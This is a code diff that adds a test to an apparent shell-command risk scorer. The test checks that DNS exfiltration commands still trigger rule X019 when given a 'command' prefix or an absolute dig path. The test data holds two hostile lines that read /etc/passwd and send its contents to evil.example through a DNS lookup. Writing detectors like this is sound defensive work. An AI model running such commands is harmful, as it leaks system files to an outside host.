@@ -56,3 +56,13 @@ def test_modprobe_in_package_and_pkill_av_are_not_clean():
         score, rules = _score(line)
         assert score >= 25
         assert rule in rules
+
+
+def test_dns_exfiltration_survives_command_prefix_and_absolute_path():
+    for line in (
+        'command dig $(cat /etc/passwd).evil.example',
+        '/usr/bin/dig $(cat /etc/passwd).evil.example',
+    ):
+        score, rules = _score(line)
+        assert score >= 25
+        assert "X019" in rules
